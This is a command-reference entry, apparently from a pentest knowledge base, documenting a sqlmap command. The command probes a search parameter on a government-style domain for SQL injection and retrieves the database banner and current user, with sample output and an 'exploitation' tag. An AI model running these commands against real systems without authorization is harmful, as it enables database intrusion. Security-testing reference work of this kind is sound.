---
id: cmd-001
data: 'sqlmap -u "http://target-subdomain.gov/search.php?q=1" --banner --current-user'
tags:
  - sqli
  - exploitation
type: command
output: >-
  banner: 'MySQL 5.7.32-log\nMySQL Community Server - GPL'\ncurrent user:
  'admin'@'localhost'
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:25.965Z'
verified: false
validated: true
submitted: true
---
# sqlmap-banner-extract

## Command

```bash
sqlmap -u "http://target-subdomain.gov/search.php?q=1" --banner --current-user
```

## Description

This command uses SQLMap to test a URL parameter for SQL injection and extract the database banner and current user, useful for initial reconnaissance in web app pentests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL with injectable parameter | Yes |
| `--banner` | Retrieve DBMS banner | No |
| `--current-user` | Retrieve current database user | No |

## Examples

### Basic Usage

```bash
sqlmap -u "http://example.com/page.php?id=1" --banner
```

### Advanced Usage

```bash
sqlmap -u "http://example.com/page.php?id=1" --banner --current-user --dbms=mysql --level=3
```

## Expected Output

Database banner and user details printed to console, e.g., banner: 'MySQL 5.7.32-log', current user: 'admin'@'localhost'. Errors if no vulnerability.

## Related

- [[Related Procedure: Exploit-SQL-Injection-with-SQLMap-on-Multiple-Subdomains]]
